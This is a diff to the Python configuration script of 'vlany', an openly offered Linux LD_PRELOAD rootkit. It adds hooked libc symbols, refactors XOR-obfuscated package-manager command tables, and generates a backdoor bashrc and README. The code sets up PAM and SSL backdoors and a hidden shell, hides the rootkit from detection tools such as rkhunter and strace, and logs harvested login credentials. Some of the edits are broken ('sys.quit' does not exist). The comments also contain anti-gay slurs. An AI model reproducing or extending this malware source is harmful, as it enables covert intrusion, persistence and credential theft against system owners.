@@ -2,14 +2,16 @@
 #!/usr/bin/python2
 
 import sys
-import random
-import string
-import crypt
 
 if len(sys.argv) != 16:
     print "Why are you running me from the command line?"
     print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
-    quit()
+    sys.quit() # sys.quit is better than quit or exit
+
+# no need to import anything before now
+import random
+import string
+import crypt
 
 MAGIC_GID = int(''.join(random.choice(string.digits[1:]) for x in range(9))) # string.digits[1:] because we don't want any zeros in the magic gid. fuck that
 
@@ -30,7 +32,7 @@ elif SSL_BACKDOOR_STAT == 1:
     SSL_BACKDOOR = True
 else:
     print "Value given for ssl backdoor status (sys.argv[8]) is invalid"
-    quit()
+    sys.quit()
 
 SHELL_PASSWORD = sys.argv[9]
 LOW_PORT = int(float(sys.argv[10]))
@@ -46,7 +48,7 @@ elif PTRACE_BUG_STAT == 1:
     PTRACE_BUG = True
 else:
     print "Value given for ptrace bug status (sys.argv[14]) is invalid"
-    quit()
+    sys.quit()
 
 PTRACE_BUG_MSG = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(50))
 ACTIVATE_SWITCH = False
@@ -59,6 +61,7 @@ SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"
 # amount of library functions being hooked = (4 * 22) + 3 = 91
 CALLS = ["rename", "renameat", "renameat2", "fread",
          "stat", "stat64", "fstat", "fstat64",
+         "fstatat", "fstatat64",
          "lstat", "lstat64", "__lxstat", "__lxstat64",
          "__fxstat", "__fxstat64", "__xstat", "__xstat64",
          "fgets", "fgetflags", "fsetflags",
@@ -89,6 +92,7 @@ CALLS = ["rename", "renameat", "renameat2", "fread",
 # should i accidentally miss out some hooked library symbols, vlany could be caught out by an admin. if this happens, just add whatever symbol(s) i missed out into this list and it's fixed :p
 LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
              "stat", "stat64", "fstat", "fstat64",
+             "fstatat", "fstatat64",
              "lstat", "lstat64", "__lxstat", "__lxstat64",
              "__fxstat", "__fxstat64", "__xstat", "__xstat64",
              "ptrace", "fwrite", "fwrite_unlocked", "fputs_unlocked",
@@ -117,6 +121,7 @@ LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and t
 # GAY_PROCS is a bit of a misnaming. this can also include environment variables :)
 GAY_PROCS = ["ldd", "unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]
 
+# this was an experimental addition for the lxc container to hide the default network interface created by lxc, but you just have to not use the default  
 HIDDEN_INTERFACES = ["lxcbr0"]
 
 # you should NEVER turn these on in a real life environment, they will cause the box to shit itself
@@ -157,6 +162,7 @@ SHELL_MSG = """
 
 \033[0m"""
 
+# i feel like this is kind of useless now... may remove in time
 HELP_MSG = """\033[1m// execve commands\033[0m
 ./help <pass>\n\t- show this message
 ./[un]hide <pass> <path>\n\t- dynamically hide or unhide a file
@@ -229,38 +235,51 @@ def const_h_setup():
     const_h += '#define HIDDEN_XATTR_1_STR "' + xor(HIDDEN_XATTR_1_STR) + '"\n'
     const_h += '#define HIDDEN_XATTR_2_STR "' + xor(HIDDEN_XATTR_2_STR) + '"\n'
 
+    const_h += '#define X_USAGE "' + xor("Usage: ./%s [pw] [%s] [pkg name]\n") + '"\n' # template string used for snprintf in busage function
+    const_h += '#define E_SMSG "' + xor("%s FINISHED AND MAGIC_GID RESET. \033[1;32mWE'RE HIDDEN AGAIN\033[0m\n") + '"\n' # message used after successful command executions
+    const_h += '#define GID_SET "' + xor("SETTING GID TO 0\n") + '"\n'
+
     # yum, not finished yet, will complete when i can
     const_h += '#define YUM "' + xor("yum") + '"\n'
     const_h += '#define YUM_WARNING "' + xor("\033[1;31mTHIS FUNCTION ALLOWS YOU TO USE YUM WITHOUT DYING LOL.\nTHE YUM PROCESS WILL BE COMPLETELY VISIBLE WHILE IT IS RUNNING.\nYOU ARE POTENTIALLY RISKING YOUR OBSCURITY WHILE YOU RUN THIS COMMAND.\nYOU HAVE BEEN WARNED. PRESS ENTER TO CONTINUE. OTHERWISE, ^C TO CANCEL.\n\033[0m") + '"\n'
-    const_h += '#define YUM_USAGE "' + xor("Usage: ./yum [pw] [install/update/erase/shell] [package name]\n") + '"\n'
     
-    const_h += '#define YUM_SUCCESS "' + xor("YUM FINISHED AND MAGIC_GID RESET. \033[1;32mYOU ARE HIDDEN AGAIN\033[0m.\n") + '"\n'
-    
-    const_h += '#define YUM_INSTALL "' + xor("install") + '"\n'
-    const_h += '#define YUM_UPDATE "' + xor("update") + '"\n'
-    const_h += '#define YUM_ERASE "' + xor("erase") + '"\n'
-    const_h += '#define YUM_SHELL "' + xor("shell") + '"\n'
-    
-    const_h += '#define YUM_INSTALL_CMD "' + xor("yum install -y %s") + '"\n'
-    const_h += '#define YUM_UPDATE_CMD "' + xor("yum update -y") + '"\n'
-    const_h += '#define YUM_ERASE_CMD "' + xor("yum erase -y %s") + '"\n'
-    const_h += '#define YUM_SHELL_CMD "' + xor("yum shell") + '"\n'
-    
+    # used for function busage in execve
+    # busage builds a usage string based off of the command options for that command
+    YUM_OPTIONS = ["install", "update", "erase", "shell"]
+    const_h += '#define YUM_OPT_SIZE ' + str(len(YUM_OPTIONS)) + '\n'
+    YUM_OPTIONS_LIST = 'static char *yum_options[YUM_OPT_SIZE] = {'
+    for x in YUM_OPTIONS:
+        YUM_OPTIONS_LIST += '"{0}",'.format(xor(x))
+    YUM_OPTIONS_LIST = YUM_OPTIONS_LIST[:-1] + "};\n"
+    const_h += YUM_OPTIONS_LIST
+
+    YUM_COMMANDS = ["yum install -y %s", "yum update -y", "yum erase -y %s", "yum shell"]
+    const_h += '#define YUM_COM_SIZE ' + str(len(YUM_COMMANDS)) + '\n'
+    YUM_COMMANDS_LIST = 'static char *yum_commands[YUM_COM_SIZE] = {'
+    for x in YUM_COMMANDS:
+        YUM_COMMANDS_LIST += '"{0}",'.format(xor(x))
+    YUM_COMMANDS_LIST = YUM_COMMANDS_LIST[:-1] + "};\n"
+    const_h += YUM_COMMANDS_LIST
+
     # apt-get
     const_h += '#define APT "' + xor("apt") + '"\n'
     const_h += '#define APT_WARNING "' + xor("\033[1;31mTHIS FUNCTION ALLOWS YOU TO USE APT-GET WITHOUT FUCKING UP DPKG'S DB.\nTHE APT-GET PROCESS WILL BE COMPLETELY VISIBLE WHILE IT IS RUNNING.\nYOU ARE POTENTIALLY RISKING YOUR OBSCURITY WHILE YOU RUN THIS COMMAND.\nYOU HAVE BEEN WARNED. PRESS ENTER TO CONTINUE. OTHERWISE, ^C TO CANCEL.\n\033[0m") + '"\n'
-    const_h += '#define APT_USAGE "' + xor("Usage: ./apt [pw] [update/install/remove] [package_name]\n") + '"\n'
 
-    const_h += '#define APT_GID_SET "' + xor("SETTING GID TO 0\n") + '"\n'
-    const_h += '#define APT_SUCCESS "' + xor("APT-GET FINISHED AND MAGIC_GID RESET. \033[1;32mYOU ARE HIDDEN AGAIN\033[0m.\n") + '"\n'
+    APT_OPTIONS = ["update", "install", "remove"]
+    const_h += '#define APT_OPT_SIZE ' + str(len(APT_OPTIONS)) + '\n'
+    APT_OPTIONS_LIST = 'static char *apt_options[APT_OPT_SIZE] = {'
+    for x in APT_OPTIONS:
+        APT_OPTIONS_LIST += '"{0}",'.format(xor(x))
+    APT_OPTIONS_LIST = APT_OPTIONS_LIST[:-1] + "};\n"
+    const_h += APT_OPTIONS_LIST
 
-    const_h += '#define APT_UPDATE "' + xor("update") + '"\n'
-    const_h += '#define APT_INSTALL "' + xor("install") + '"\n'
-    const_h += '#define APT_REMOVE "' + xor("remove") + '"\n'
-
-    const_h += '#define APT_UPDATE_CMD "' + xor("apt-get update") + '"\n'
-    const_h += '#define APT_INSTALL_CMD "' + xor("apt-get --yes --force-yes install %s") + '"\n'
-    const_h += '#define APT_REMOVE_CMD "' + xor("apt-get --yes --force-yes remove %s") + '"\n'
+    APT_COMMANDS = ["apt-get update", "apt-get --yes --force-yes install %s", "apt-get --yes --force-yes remove %s"]
+    const_h += '#define APT_COM_SIZE ' + str(len(APT_COMMANDS)) + '\n'
+    APT_COMMANDS_LIST = 'static char *apt_commands[APT_COM_SIZE] = {'
+    for x in APT_COMMANDS:
+        APT_COMMANDS_LIST += '"{0}",'.format(xor(x))
+    APT_COMMANDS_LIST = APT_COMMANDS_LIST[:-1] + "};\n"
+    const_h += APT_COMMANDS_LIST
 
     const_h += '#define XATTR "' + xor("user.%s") + '"\n'
 
@@ -407,6 +426,8 @@ alias rechattr='cd {0}; chattr +ia * &>/dev/null; echo "rootkit files chattr per
 echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
 [ -f `which shred 2>/dev/null || echo "NO"` ] && alias vshred='shred -n 5 --random-source=/dev/urandom -uvz'
 echo "Use 'alias' to view list of all bash aliases."
+
+# you're on your own now...
 """
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
@@ -423,7 +444,7 @@ echo "Use 'alias' to view list of all bash aliases."
 ╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝
  ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝
-        (rootkit for homosexuals)
+      /(a rootkit for homosexuals)\\
 
 If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell. Now that you've started reading this, there's a few things you should know.
 vlany is now a public rootkit! Thanks for using me, it means a lot. Enjoy, and try not to get caught. :p
@@ -478,6 +499,7 @@ Read this AT LEAST twice, when you're done, quit this screen by pressing q. This
     fd.write(BD_README)
     fd.close()
 
+# might tidy this up in a bit, like i done with install.sh
 def main():
     const_h_setup()
     bash_rc_setup()
